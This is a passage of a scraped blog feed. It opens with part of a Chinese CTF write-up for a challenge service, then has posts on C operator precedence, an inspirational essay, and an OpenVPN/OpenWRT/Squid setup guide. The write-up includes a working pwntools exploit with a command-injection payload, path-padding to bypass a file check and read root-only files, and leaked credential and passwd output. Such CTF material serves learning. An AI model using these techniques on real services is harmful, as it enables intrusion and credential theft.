checkfile之前有一个操作是memcpy，但是只复制了前0x100字节，这个好像是我偶然间发现的……因为我同一个文件名用/加长不同长度有一次成功了，有一次没成功，就多看了一眼，发现居然还有这个问题。那相当于是这个check是完全可以绕过了。 有师傅说从config.dat文件可以得到用户名和密码，那个文件我完全不知道是干啥用的，还是二进制的，就没管。 我是先用readfile读了当前目录的shadow文件，里面有用户名和密码，然后去认证、进行命令注入，通过命令注入一点点探测服务器是什么情况。 放一点当时命令注入得到的一些服务器上的信息。 根目录 ls -la / 1234567891011121314151617181920212223242526total 84drwxr-xr-x 1 root root 4096 Feb 1 01:20 .drwxr-xr-x 1 root root 4096 Feb 1 01:20 ..-rwxr-xr-x 1 root root 0 Feb 1 01:20 .dockerenvdrwxr-xr-x 1 root root 4096 Jan 21 10:04 bindrwxr-xr-x 2 root root 4096 Apr 12 2016 bootdrwxr-xr-x 14 root root 3660 Feb 1 01:20 devdrwxr-xr-x 1 root root 4096 Feb 1 01:20 etc-rwxr----- 1 root root 43 Jan 29 12:53 flagG1zjindrwxr-xr-x 1 root root 4096 Jan 29 12:10 homedrwxr-xr-x 1 root root 4096 Jan 21 10:04 libdrwxr-xr-x 2 root root 4096 Jan 21 10:04 lib32drwxr-xr-x 1 root root 4096 Jan 21 10:03 lib64drwxr-xr-x 2 root root 4096 Oct 30 15:50 mediadrwxr-xr-x 2 root root 4096 Oct 30 15:50 mntdrwxr-xr-x 2 root root 4096 Oct 30 15:50 optdr-xr-xr-x 123 root root 0 Feb 1 01:20 procdrwx------ 2 root root 4096 Oct 30 15:53 rootdrwxr-xr-x 1 root root 4096 Oct 30 15:53 rundrwxr-xr-x 1 root root 4096 Jan 21 10:04 sbin-rwxr-xr-x 1 root root 212 Jan 29 12:10 service.shdrwxr-xr-x 2 root root 4096 Oct 30 15:50 srvdr-xr-xr-x 13 root root 0 Feb 1 01:20 sysdrwxrwxrwt 1 root root 4096 Feb 1 01:21 tmpdrwxr-xr-x 1 root root 4096 Jan 21 10:04 usrdrwxr-xr-x 1 root root 4096 Oct 30 15:53 var /etc/passwd 文件 cat /etc/passwd 1234567891011121314151617181920212223242526root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/falsesystemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/falsesystemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/falsesystemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false_apt:x:104:65534::/nonexistent:/bin/falsesyslog:x:105:107::/home/syslog:/bin/falseuml-net:x:106:108::/nonexistent:/bin/falsemessageBox:x:1000:1000::/home/messageBox: 当前目录下的shadow文件 cat /home/messageBox/shadow1admin:alexandr1s 可以看到flag其实是根目录下的/flagG1zjin，权限是只有root可读，直到比赛快结束了我才意识到这一点，就是我就是root…… 直接readfile读/flagG1zjin就可 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687#!/usr/bin/pythonfrom pwn import *from const import constlstcontext.log_level=logging.DEBUGcontext.terminal=['tmux','new-window']context.endian='big'LOCAL=0if LOCAL: p=remote('localhost',6780)else: p=remote('183.129.189.60',10016) def read(filename): content=b'readFile:'.ljust(0x201,b'/') # content+=b'/home/messageBox/lib' content+=filename content+=b'\x00' return contentdef ifconfig(): content=b'ifconfig:./'.ljust(0x101,b'/') content+=b'\x00' return contentdef auth(): content=b'setSystemParam:username:admin\npasswd:alexandr1s\n'.ljust(0x101,b'/') content+=b'\x00' return contentdef cmd(): content=b'leaveName:8EB696DDDD69:'.ljust(0x101,b':') # content+=b'12";ls -la / &gt; /tmp/ainevsia;# " echo "' # content+=b'12";ls -la /home/messageBox &gt; /tmp/ainevsia;# " echo "' content+=b'12";id &gt; /tmp/ainevsia;# " echo "' content+=b'\x00' return content# content=auth()# content=ifconfig()# content=cmd()# content=read(b'/tmp/ainevsia')content=read(b'/flagG1zjin')def crc(): global content crcsum = 0xFFFFFFFF for i in range(len(content)): crcsum = (crcsum &gt;&gt; 8) ^ constlst[(crcsum ^ content[i]) &amp; 0xff] return (~crcsum) &amp; 0xFFFFFFFFpayload=b'HwsDDW' # header : 6 bytespayload+=p16(len(content)) # msglen : 2 bytespayload+=p16(0x102) # choice : 2 bytespayload+=p32(crc()) # crcsum : 4 bytespayload+=contentp.success(payload)p.send(payload)content=p.recvall()import base64content=base64.b64decode(content)p.success(content)with open('./recv_content','wb') as f: f.write(content)# p.interactive()'''9:26 ainevsia@iZuf66pdfsjc1ria8l5enjZ /home/ainevsia/ctf/dasctf/easymsg% ./exp.py[+] Opening connection to 183.129.189.60 on port 10016: Done[+] b'HwsDDW\x02\r\x01\x02\xc7\x0b\x9d\xdcreadFile://///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////flagG1zjin\x00'[DEBUG] Sent 0x21b bytes: 00000000 48 77 73 44 44 57 02 0d 01 02 c7 0b 9d dc 72 65 │HwsD│DW··│····│··re│ 00000010 61 64 46 69 6c 65 3a 2f 2f 2f 2f 2f 2f 2f 2f 2f │adFi│le:/│////│////│ 00000020 2f 2f 2f 2f 2f 2f 2f 2f 2f 2f 2f 2f 2f 2f 2f 2f │////│////│////│////│ * 00000210 66 6c 61 67 47 31 7a 6a 69 6e 00 │flag│G1zj│in·│ 0000021b[+] Receiving all data: Done (60B)[DEBUG] Received 0x3c bytes: b'ZmxhZ3s3MmJhMTk0ZS1kYTFlLTRlOWMtYmE2OC03MTljYWUyZTNlZTB9Cg=='[*] Closed connection to 183.129.189.60 port 10016[+] b'flag&#123;72ba194e-da1e-4e9c-ba68-719cae2e3ee0&#125;\n'''']]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[C () -> 运算符优先级]]></title>
    <url>%2F2020%2F08%2F13%2Foperator-precedence%2F</url>
    <content type="text"><![CDATA[最近开始学习windows环境下的编程，很多C的知识都有点忘记了，这里碰到两个脑子突然转不过弯的地方，这里记录一下。 优先级 (type cast) p -&gt; a这样的表达式有两个运算符，一个是强制类型转换，一个是取指针对象的成员变量，这两个运算符一个在前，一个在后，那么应该先执行哪一个呢？ 事实证明，应该先执行-&gt;，那么我们去查查运算符优先级表。 第一眼看上去，这括号和-&gt;不是在同一类优先级中吗？那是不是应该遵循从左到有的规则，先做强制类型转换再取成员变量？ Noooo.这个括号是函数调用啊哥，看第二组的type cast括号，那才是类型转换。 多重括号 还有一个我一下子没转过弯来的是这个多加几个括号的问题。我的印象里括号只要成对加多少个都没问题，这里我在sizeof里多加了一对括号咋就不能编译了呢？？ 表达式两边加多少个括号确实无所谓，但是这里不是表达式啊…里面是个类型，编译器认为你是在做类型装换。]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[生命是一种长期而持续的累积过程]]></title>
    <url>%2F2020%2F07%2F15%2Flife%2F</url>
    <content type="text"><![CDATA[台湾清华大学电机系 彭明辉 许多同学应该都还记得联考前夕的焦虑：差一分可能要掉好几个志愿，甚至于一生的命运从此改观！到了大四，这种焦虑可能更强烈而复杂：到底要先当兵，就业，还是先考研究所？我就经常碰到充满焦虑的学生问我这些问题。可是，这些焦虑实在是莫须有的！生命是一种长期而持续的累积过程，绝不会因为单一的事件而毁了一个人的一生，也不会因为单一的事件而救了一个人的一生。属于我们该得的，迟早会得到；属于我们不该得的，即使侥幸巧取也不可能长久保有。如果我们看清这个事实，许多所谓“人生的重大抉择”就可以淡然处之，根本无需焦虑。而所谓“人生的困境”，也往往会变得无足挂齿。 我自己就是一个活生生的例子。从一进大学就决定不再念研究所，所以，大学四年的时间多半在念人文科学的东西。毕业后工作了几年，才决定要念研究所。硕士毕业后，立下决心：从此不再为文凭而念书。谁知道，世事难料，当了五年讲师后，我又被时势所迫，出国念博士。出国时，一位大学同学笑我：全班最晚念博士的都要回国了，你现在才要出去？两年后我从剑桥回来，觉得人生际遇无常，莫此为甚：一个从大一就决定再也不钻营学位的人，竟然连硕士和博士都拿到了！属于我们该得的，哪样曾经少过？而人生中该得与不该得的究竟有多少，我们又何曾知晓？从此我对际遇一事不能不更加淡然。 当讲师期间，有些态度较极端的学生会当面表现出他们的不屑；从剑桥回来时，却被学生当作不得了的事看待。这种表面上的大起大落，其实都是好事者之言，完全看不到事实的真相。从表面上看来，两年就拿到剑桥博士，这好像很了不起。但是，在这两年之前我已经花整整一年，将研究主题有关的论文全部看完，并找出研究方向；而之前更已花三年时间做控制方面的研究，并且在国际著名的学术期刊中发表论文。而从硕士毕业到拿博士，期间七年的时间我从不停止过研究与自修。所以，这个博士其实是累积了七年的成果，或者，只算我花在控制学门的时间，也至少有五年，根本也没什么好惊讶的。 常人不从长期而持续的累积过程来看待生命因积蓄而有的成果，老爱在表面上以断裂而孤立的事件夸大议论，因此每每在平淡无奇的事件上强作悲喜。可是对我来讲，当讲师期间被学生瞧不起，以及剑桥刚回来时被同学夸大本事，都只是表象。事实是：我只在乎每天二十四小时点点滴滴的累积。 拿硕士或博士只是特定时刻里这些成果累积的外在展示而已，人生命中真实的累积从不曾因这些事件而终止或添加。 常有学生满怀忧虑的问我：“老师，我很想先当完兵，工作一两年再考研究所。这样好吗？”“很好，这样子有机会先用实务来印证学理，你念研究所时会比别人了解自己要的是什么。”“可是，我怕当完兵又工作后，会失去斗志，因此考不上研究所。”“那你就先考研究所好了。”“可是，假如我先念研究所，我怕自己又会像念大学时一样茫然，因此念的不甘不愿的。”“那你还是先去工作好了！”“可是……” 我完全可以体会到他们的焦虑，可是却无法压抑住对于这种话的感慨。其实，说穿了他所需要的就是两年研究所加两年工作，以便加深知识的深广度和获取实务经验。先工作或先升学，表面上大相迳庭，其实骨子里的差别根本可以忽略。 在“朝三暮四”这个成语故事里，主人原本喂养猴子的橡实是“早上四颗下午三颗”，后来改为“朝三暮四”，猴子就不高兴而坚持改回到“朝四暮三”。其实，先工作或先升学，期间差异就有如“朝三暮四”与“朝四暮三”，原不值得计较。但是，我们经常看不到这种生命过程中长远而持续的累积，老爱将一时际遇中的小差别夸大到生死攸关的地步。 最讽刺的是：当我们面对两个可能的方案，而焦虑得不知如何抉择时，通常表示这两个方案可能一样好，或者一样坏，因而实际上选择哪个都一样，唯一的差别只是先后之序而已。而且，愈是让我们焦虑得厉害的，其实差别越小，愈不值得焦虑。反而真正有明显的好坏差别时，我们轻易的就知道该怎么做了。可是我们却经常看不到长远的将来，短视的盯着两案短期内的得失：想选甲案，就舍不得乙案的好处；想选乙案，又舍不得甲案的好处。如果看得够远，人生长则八、九十，短则五、六十年，先做哪一件事又有什么关系？甚至当完兵又工作后，再花一整年准备研究所，又有什么了不起？当然，有些人还是会忧虑说：”我当完兵又工作后，会不会因为家累或记忆力衰退而比较难考上研究所？”我只能这样回答：”一个人考不上研究所，只有两个可能：或者他不够聪明，或者他的确够聪明。不够聪明而考不上，那也没什么好抱怨的。假如你够聪明，还考不上研究所，那只能说你的决心不够强。假如你是决心不够强，就表示你生命中还有其他的可能性，其重要程度并不下于硕士学位，而你舍不得丢下他。既然如此，考不上研究所也无须感到遗憾。不是吗？ “人生的路这么多，为什么要老斤斤计较着一个可能性?” 我高中最要好的朋友，一生背运：高中考两次，高一念两次，大学又考两次，甚至连机车驾照都考两次。毕业后，他告诉自己：我没有关系，也没有学历，只能靠加倍的诚恳和努力。现在，他自己拥有一家公司，年收入数千万。 一个人在升学过程中不顺利，而在事业上顺利，这是常见的事。有才华的人，不会因为被名校拒绝而连带失去他的才华，只不过要另外找适合他表现的场所而已。反过来，一个人在升学过程中太顺利，也难免因而放不下身段去创业，而只能乖乖领薪水过活。 福兮祸兮，谁人知晓？我们又有什么好得意？又有什么好忧虑？人生的得与失，有时候怎么也说不清楚，有时候却再简单不过了：我们得到平日累积的成果，而失去我们不曾努力累积的！所以重要的不是和别人比成就，而是努力去做自己想做的。最后该得到的不会少你一分，不该得到的也不会多你一分。 好像是前年的时候，我遇到一位高中同学。他在南加大当电机系的副教授，被清华电机聘回来开短期课程。从高中时代他就很用功，以第一志愿上台大电机后，四年都拿书卷奖，相信他在专业上的研究也已卓然有成。回想高中入学时，我们两个人的智力测验成绩分居全学年第一，第二名。可是从高一我就不曾放弃自己喜欢的文学，音乐，书法，艺术和哲学，而他却始终不曾分心，因此两个人在学术上的差距只会愈来愈远。反过来说，这十几二十年我在人文领域所获得的满足，恐怕已远非他能理解的了。我太太问过我，如果我肯全心专注于一个研究领域，是不是至少会赶上这位同学的成就？我不这样想，两个不同性情的人，注定要走两条不同的路。不该得的东西，我们注定是得不到的，随随便便拿两个人来比，只看到他所得到的，却看不到他所失去的，这有什么意义？ 有次清华电台访问我：“老师你如何面对你人生中的困境？”我当场愣在那里，怎么样都想不出我这一生什么时候有过困境！后来仔细回想，才发现：我不是没有过困境，而是被常人当作“困境”的境遇，我都当作一时的际遇，不曾在意过而已。刚服完兵役时，长子已出生却还找不到工作。我曾焦虑过，却又觉得迟早会有工作，报酬也不至于低的离谱，不曾太放在心上。念硕士期间，家计全靠太太的薪水，省吃俭用，对我而言又算不上困境。一来精神上我过的很充实，二来我知道这一切是为了让自己有机会转行去教书(做自己想做的事)。三十一岁才要出国，而同学正要回系上任教，我很紧张(不知道剑桥要求的有多严)，却不曾丧气。因为，我知道自己过去一直很努力，也有很满意的心得和成果，只不过别人看不到而已. 我没有过困境，因为我从不在乎外在的得失，也不武断的和别人比高下，而只在乎自己内在真实的累积。 我没有过困境，因为我确实了解到：生命是一种长期而持续的累积过程，绝不会因为单一的事件而有剧烈的起伏。 同时我也相信：属于我们该得的，迟早会得到；属于我们不该得的，即使一分也不可能增加。假如你可以持有相同的信念，那么人生于你也会是宽广而长远，没有什么了不得的“困境”，也没有什么好焦虑的了。]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[A Guided Walk Through of OpenVPN]]></title>
    <url>%2F2019%2F08%2F27%2FOpenVPN%2F</url>
    <content type="text"><![CDATA[Before We StartIf the idea of accessing the devices under a protected private subnet has ever appeared in your mind, then OpenVPN maybe one of your choices. OpenVPN is a cross-platform software that allows you to build robust, flexible, and secure virtual private networking(VPN). Despite these renowned properties, building and configuring such a software is never an easy shoot, especially when you do it for the first time. So in this guide, I will walk you step by step through the entire process and finally build a private networking that allow you to access your devices in your home or company from every corner of the world! The whole process is boring, I have to admit in the first place, but the final system will certainly outcome those frustration during the process. So please fasten your belt and we are going to take off. First Equip Yourself with OpenWRT and A VPSOpenWRT is a Linux operating system targeting embedded devices. You can just treat it as a super-power router that runs a Linux OS so it allows you to do almost anything that an usual Linux can do. We use it mainly to serve as the OpenVPN Client and the router that connects all the devices under it into the Internet. As opposed to the OpenVPN Client, there is a OpenVPN Server running on a remote VPS(Cloud Virtual Private Servers). Any server that has a public IP can server as the OpenVPN Server. In this tutorial, I will use the VPS server provided by aliyun running Ubuntu 16.04. I choose these just because I’m used to it, you can choose whatever cloud service provider with whatever Linux distribution that you are familiar with or prefer, it really doesn’t count. Cloud Server SetupNow let’s login to the cloud server that we have just brought for the first time(maybe via the web page or password). We must make some configurations there to make it a OpenVPN Server. Basic Linux Cloud Server Security Setup (Optional)Create a Non-Privileged User (Optional)If the defalut user that the cloud provider gives you is a non-root user, you can just skip this section and use that user happily. If not, create a non-privileged user and grants it the sudo privilege. 1234# if you are root, run the 2 commands$ adduser &lt;username&gt;$ usermod -a -G sudo &lt;username&gt;$ su &lt;username&gt; Upload your ssh Public Key (Optional)ssh is a command that allows you to take control of your remote server gracefully. I’m not trying to explain those fundamental concepts in this article. When you get confused of some term of command in the rest of this article, feel free to google it. In short, just copy the contents of file ~/.ssh/id_rsa.pub in your local machine and append it into the file ~/.ssh/authorized_keys on your remote server, and then you can ssh to your server from your local machine without bothering to enter the password. Strengthen your ssh (Optional)Modify /etc/ssh/sshd_config and change the two settings PasswordAuthentication and PermitRootLogin from yes to no: 12PasswordAuthentication noPermitRootLogin no Now only you, more specifically speaking, only this computer who owns the private key corresponding to the public key you have just uploaded can have legal access to login this cloud server as the user you have created(beside your cloud provider’s website). Run sudo service sshd restart to enable this configuration to take place. Install OpenVPNInstallation is just easy with apt under ubuntu, just give the command: 12sudo apt updatesudo apt install openvpn If it prompt you for choice, just choose the default choice. You can check that the OpenVPN is installed successfully by the following command. 1234567$ openvpn --versionOpenVPN 2.4.4 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] built on May 14 2019library versions: OpenSSL 1.1.1 11 Sep 2018, LZO 2.08Originally developed by James YonanCopyright (C) 2002-2017 OpenVPN Technologies, Inc. &lt;sales@openvpn.net&gt;...[omitted] Install easy-rsaeasy-rsa is just a small tool to generate the related certificates needed by OpenVPN. 1sudo apt -y install easy-rsa Build CA CertificatesMake a directory called easy-rsa under the folder /etc/openvpn and copy all the stuffs under the folder /usr/share/easy-rsa/ to the folder that we have just created. 123sudo mkdir /etc/openvpn/easy-rsa/sudo cp -r /usr/share/easy-rsa/* /etc/openvpn/easy-rsa/cd /etc/openvpn/easy-rsa/ CA Certificate is a file shares between the server and the client and it only needs to be generated once for one server. Before we build the CA certificate, make sure you have changed to root by the command sudo su. The source vars command sets up the environment needed by the following ./build-ca command according to the contents in the file named vars. 1234sudo susource vars./clean-all./build-ca Now you are the root, which means you should be extremely careful when you type because this superuser can do anything to your server.If you saw the following warning after executing the command source vars, you should add another command to make a soft link to that missing file. I have a file named openssl-1.0.0.cnf under my folder so I just use this command: ln -s ./openssl-1.0.0.cnf openssl.cnf. 1234*********************************************** No /etc/openvpn/easy-rsa/openssl.cnf file could be found Further invocations will fail*********************************************** If you are not reading this part of article for the first time, you should be aware that the command ./clean-all is DANGEROUS. What this command do is simply removing all the files under the folder keys, which contains all the things you have generated since you installed easy-rsa. So be sure you know what you are doing before giving this command. If the above commands finished successfully, you will find some new files generated in the folder keys. Copy the file ca.crt to the folder /etc/openvpn. We do this copy command simply because OpenVPN assumes that all the configuration files locates in the default folder /etc/openvpn. If you are skilled enough, it is not necessary since you can specify the configuration files in your .conf file(see section below). 1cp /etc/openvpn/easy-rsa/keys/ca.crt /etc/openvpn Build Server CertificateHere I wrote aliyun as the first parameter, which totally depends on your preference. You can name it whatever you think is meaningful to you. 1./build-key-server aliyun Now more new stuffs appears in the keys folder. Copy aliyun.crt, aliyun.key to the folder /etc/openvpn. 1cp keys/aliyun.key keys/aliyun.crt /etc/openvpn/ Build the Diffie-Hellman file and ta.keyDiffie-Hellman file and ta.key is used to strengthen the security of the network. There is no need to understand what they really are, so just copy and paste the following commands. 1234./build-dhcp keys/dh2048.pem /etc/openvpnopenvpn --genkey --secret ta.keycp ./ta.key /etc/openvpn Build Client CertificatesAs opposed to Server Certificates which are files stored in the remote server forever, Client Certificates are files generated on the remote server but used by the multiple end-users, which means they will be copy out from the server one day. 12./build-key ainevsiacp keys/ainevsia.key keys/ainevsia.crt /etc/openvpn/ Here ainevsia should also be DIYed by you. How To Add a New ClientTo add a new client just means building another client certificate. You can just run the above command twice the achieve that purpose. Caution that the server may prompt you to run source vars again. Do so but DO NOT RUN ./clean-all, that will remove all the files you already generated. just run source vars &amp;&amp; ./build-key client-name will be safe. See the following example. 12345678910root@iZuf6dpjg5t8prvwa2ajodZ:/etc/openvpn/easy-rsa$ ./build-key openwrt Please edit the vars script to reflect your configuration, then source it with "source ./vars". Next, to start with a fresh PKI configuration and to delete any previous certificates and keys, run "./clean-all". Finally, you can run this tool (pkitool) to build certificates/keys.root@iZuf6dpjg5t8prvwa2ajodZ:/etc/openvpn/easy-rsa# source vars &amp;&amp; ./build-key openwrtNOTE: If you run ./clean-all, I will be doing a rm -rf on /etc/openvpn/easy-rsa/keysGenerating a 2048 bit RSA private key[...] 1cp keys/openwrt.crt keys/openwrt.key /home/&lt;username&gt; Here we already have built two clients: openwrt and ainevsia. They will all be used in the following sections. If you have kept reading till this line, then congratulations, you have finished generating all the boring but essential crypto files that serve to secure our network. Now we will move on to configure the real OpenVPN. Setup the Server’s OpenVPNFirst of all, copy a sample config file from the official documents. 123cp /usr/share/doc/openvpn/examples/sample-config-files/server.conf.gz /etc/openvpn/cd /etc/openvpngzip -d server.conf.gz Now change the essential entries according to your requests. Personally, I changed the port from the default 1194 to my customized port and select the proto tcp. I also uncommented the line client-to-client because all I want to do is just make connections between clients :D. The lines that you should change are these lines: 123456789101112131415161718proto tcpport 1194# change to your preferred port, 59318 in the article (just for example)ca ca.crtcert server.crt# change to aliyun.crtkey server.key # This file should be kept secret# change to aliyun.keylog /var/log/openvpn/openvpn.log# uncomment this line (personal preference)client-to-client;explicit-exit-notify 1 Change the server.crt and server.key to the file names that you use. Additionally, if your configure files are not in the same folder of this server.conf file, write the absolute file path instead. Modify Client’s OpenVPN Config FileJust like the above section, we change the client configuration files following the same guide line by the way. 1cp /usr/share/doc/openvpn/examples/sample-config-files/client.conf /etc/openvpn/ 12345proto tcpremote &lt;IP&gt; 59318&lt;Port&gt;ca ca.crtcert ainevsia.crtkey ainevsia.key Server Side Configuration FinishedModifying the config file is really the most difficult part of this process. If you finish, you can finally launch the OpenVPN service. 12cd /etc/openvpnsystemctl restart openvpn@server.service If the above command cannot start the service, try # openvpn --config /etc/openvpn/server.conf &amp;. Here is a demo of how a success launch may look like. If your port number doesn’t show up in the netstat -tunlp command, that means the OpenVPN service does not start successfully. 1234root@iZuf6dpjg5t8prvwa2ajodZ:/etc/openvpn# openvpn --config /etc/openvpn/server.conf &amp;[1] 8560root@iZuf6dpjg5t8prvwa2ajodZ:/etc/openvpn# netstat -tunlp | grep 59318tcp 0 0 0.0.0.0:59318 0.0.0.0:* LISTEN 8560/openvpn Final Working DirectoryHere’s a look from my cloud server when I started the OpenVPN service. 12345678910111213141516$ tree /etc/openvpn/ -L 1/etc/openvpn/├── aliyun.crt├── aliyun.key├── ca.crt├── client.conf├── dh2048.pem├── easy-rsa├── ipp.txt├── ainevsia.crt├── ainevsia.key├── openvpn.log├── openvpn-status.log├── server.conf├── ta.key└── update-resolv-conf The OpenVPN Server needs the file server.conf to start up normally. The files ca.crt client.conf ainevsia.crt ainevsia.key ta.key dh2048.pem will all be needed by the client, so we are going to download these file next from our cloud server to the local computer, which is the client. Get the Client Config FileYou can use the sftp command. Copy the file to the home directory and then change the privilege. Then you can use sftp to get your files. 123sudo cp ca.crt ainevsia.crt ainevsia.key ta.key client.conf ~/cdsudo chmod o+r ainevsia.key ta.key If you are on Windows, change the file client.conf to ainevsia.ovpn. The Big PictureBefore we move on to the OpenWRT section, you can checkout the following image to make sure that we are on the right track. OpenWRT from ScratchBasic ConnectionTo make demonstrations, I reset my OpenWRT router so I can make configures from scratch. Here is the official documents. This router enables wireless connections by default, so we can connect to it via Wi-Fi. Otherwise, you have to get a network cable between your local computer and your router. There is no password required before I successfully connected to its Wi-Fi and the default gateway is 192.168.1.1, which I will change to 192.168.10.1 because my upper router also has IP 192.168.1.1 which may harm the successful network connection of my OpenWRT router. The first thing to do after connection is to set a password for the Wi-Fi. Before proceeding, make sure that you have plugged in the network cable in the WAN port of the router so that it can surf the Internet because we need Internet connection while downloading packages. Then all the commands are carried out during ssh. Here is the OpenWRT version and the Linux kernel version. 123456789101112BusyBox v1.29.2 () built-in shell (ash) _______ ________ __ | |.-----.-----.-----.| | | |.----.| |_ | - || _ | -__| || | | || _|| _| |_______|| __|_____|__|__||________||__| |____| |__| W I R E L E S S F R E E D O M ----------------------------------------------------- OpenWrt 18.06.1, r1026-811894e1 -----------------------------------------------------root@OpenWrt:~# uname -aLinux OpenWrt 4.9.138 #0 Fri Nov 30 14:52:43 2018 mips GNU/Linux Install OpenVPNopkg is the OpenWRT‘s splendid package manager, just like apt and apt-get in Linux. However, the default source in the file distfeeds.conf is blocked in China mainland, so change the sourse to USTC open source software mirror. Then update will be fast and happy. 1234567root@OpenWrt:~# cd /etc/opkg/root@OpenWrt:/etc/opkg# lscustomfeeds.conf distfeeds.conf keysroot@OpenWrt:/etc/opkg# cp distfeeds.conf distfeeds.conf.bkup # backup before any operationsroot@OpenWrt:/etc/opkg# sed -i "s/openwrt.proxy.ustclug.org/mirrors.ustc.edu.cn\/lede/" /etc/opkg/distfeeds.confroot@OpenWrt:/etc/opkg# opkg updateroot@OpenWrt:/etc/opkg#opkg install openvpn-openssl Upload Configuration FilesNow we need to upload our configuration files onto the OpenWRT router, which requires the sftp service which need installation. 1root@OpenWrt:/etc/opkg# opkg install openssh-sftp-server Configuring the client is just the same as the server. The core file here is the client.ovpn. 123456root@OpenWrt:/etc/openvpn# openvpn client.ovpnFri Sep 27 13:09:43 2019 OpenVPN 2.4.5 mips-openwrt-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [MH/PKTINFO] [AEAD][nonblock][.. omitted]Fri Sep 27 13:09:46 2019 Initialization Sequence Completed If you see the last line Initialization Sequence Completed, then well done. You almost finished all the steps and the network is nearly set up. Start on BootNow we are going to make this OpenVPN service start automatically each time it boots up, since the OpenWRT is not like the cloud server, it may reboot for any unexpected reason. Luckily, OpenWRT provides a uniformed configuration interface called UCI. It is simple and robust to use the UCI to make configurations to achieve the desired service. The only thing to do is to modify the /etc/config/openvpn file. 12345678910111213package openvpn################################################## Sample to include a custom config file. ##################################################config openvpn custom_config # Set to 1 to enable this instance: option enabled 1 # Include OpenVPN configuration option config /etc/openvpn/client.conf Now you can test your OpenVPN connection by launching a new terminal and run logread -f command, which is used to track system logs, before the /etc/init.d/openvpn restart command. The following two command makes the OpenVPN service starts on boot. 12/etc/init.d/openvpn enable/etc/init.d/openvpn restart Finally, you should use the command reboot to gently stop and restart the router instead of powering it off. If successful, it will automatically connects to the server. If not, /etc/init.d/firewall restart. Optional SettingsGive the OpenWRT a Fixed IPThis part involves the operations on the server.conf file on the remote server. Take a look at its comments: 1234567# EXAMPLE: Suppose you want to give# Thelonious a fixed VPN IP address of 10.9.0.1.# First uncomment out these lines:client-config-dir ccdroute 10.8.0.101 255.255.255.0# Then add this line to ccd/Thelonious:# ifconfig-push 10.9.0.1 10.9.0.2 So do what it says and create the folder and the file, write ifconfig-push 10.8.0.101 10.8.0.102 into the file openwrt by the following command: 12mkdir /etc/openvpn/ccdecho ifconfig-push 10.8.0.101 10.8.0.102 &gt; /etc/openvpn/ccd/openwrt Now restart the service and it will take effect. Add A HTTP-Proxy to Allow Foreign Connection Squid is a full-featured web proxy cache server application which provides proxy and cache services for Hyper Text Transport Protocol (HTTP), File Transfer Protocol (FTP), and other popular network protocols. On your remote cloud server, install squid and htpassws, which is used for passowrd authentication. 1sudo apt install squid aainevsiahe2-utils Squid is configured by editing the directives contained within the /etc/squid/squid.conf configuration file. Prior to editing the configuration file, you should make a copy of the original file and protect it from writing so you will have the original settings as a reference, and to re-use as necessary. Make this copy and protect it from writing using the following commands: 12sudo cp /etc/squid/squid.conf /etc/squid/squid.conf.original # make copysudo chmod a-w /etc/squid/squid.conf.original # protect from anyone changing it To set your Squid server to listen on TCP port 39458 instead of the default TCP port 3128, change the http_port directive as such: 1http_port 39458 Squid allows password authentication, which depends on htpasswd to generate the password file. To enable basic_ncsa_auth (config file locates on /usr/lib/squid/basic_ncsa_auth), do the following: Add the content to the config file /etc/squid/squid.conf [TAG: auth_param]. 123auth_param basic program /usr/lib/squid/basic_ncsa_auth /etc/squid/passwdacl auth_user proxy_auth REQUIREDhttp_access allow auth_user Use htpasswd to generate the passwd file and the user. It will prompt you to enter the password twice. 1htpasswd -c /etc/squid/passwd ainevsia # ainevsia is the proxy_username which can be changed accordingly The above command generates the file /etc/squid/passwd. Now you can restart your squid server to apply this change by the command systemctl restart squid. Small Change on the Local client.ovpn fileTo enable the http-proxy service you have just configured on the remote server, you just need tiny modification on your local configuration file. Uncomment these two lines and modify the corresponding parameters in the brackets. Make your password.txt file and write the username on the first line while the password on the second line. 12http-proxy-retry # retry on connection failureshttp-proxy [ip address] [squid port] [password.txt] Finally, I append my local configuration file here for your reference: 1234567891011$ tree ././├── ca.crt├── client.ovpn├── dh2048.pem├── ainevsia.crt├── ainevsia.key├── password.txt└── ta.key0 directories, 7 files If you encounters any problems, check out the default log file of squid which locates at /var/log/squid/access.log. SuccessNow here you go. Believe it or not, we now have finished setting up a working virtual private network totally from scratch. I hope you think this really deserves the all the efforts you have spent. I want to cut off this ariticle right now, althought it has already been 